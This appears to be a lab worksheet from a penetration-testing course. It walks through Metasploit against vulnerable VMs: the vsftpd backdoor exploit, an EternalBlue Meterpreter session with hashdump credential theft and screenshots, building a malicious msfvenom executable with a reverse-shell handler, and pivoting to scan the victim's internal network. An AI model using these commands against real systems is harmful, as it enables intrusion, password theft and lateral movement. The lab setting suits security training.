# Module 12: Metasploit Practical Lab

### Task 1: Your First Exploit
1. Launch a vulnerable VM (e.g., Metasploitable 2).
2. Start `msfconsole`.
3. Search for a vulnerability: `search vsftpd`.
4. Use the backdoor exploit: `use exploit/unix/ftp/vsftpd_234_backdoor`.
5. Set the target IP: `set RHOSTS <target_ip>`.
6. Run `exploit`.
7. Once you have a shell, run `whoami` and `hostname`.

### Task 2: The Power of Meterpreter
1. Use an exploit that provides a **Meterpreter** session (e.g., an EternalBlue exploit on a Windows 7 VM).
2. Once the session is open, try these commands:
   - `sysinfo`: Get system details.
   - `getuid`: See which user you are.
   - `screenshot`: Take a photo of the victim's screen.
   - `hashdump`: Steal the password hashes from the SAM database.
   - `shell`: Drop into a regular system command prompt.

### Task 3: Custom Payload with msfvenom
1. Create a malicious `.exe` using `msfvenom` (see `commands.md`).
2. Set up the `multi/handler` in `msfconsole` to listen for the connection.
3. "Deliver" the `.exe` to your victim VM (via a shared folder or simple HTTP server).
4. Run the `.exe` on the victim machine and watch the shell pop up in your terminal.

### Task 4: Post-Exploitation Pivot
1. While in a Meterpreter session, run `ipconfig` to see if the victim has other network interfaces.
2. Use the `route` command to see the target's internal network.
3. Use `portscan` to find other machines on the victim's internal network that you couldn't see from your Kali machine.
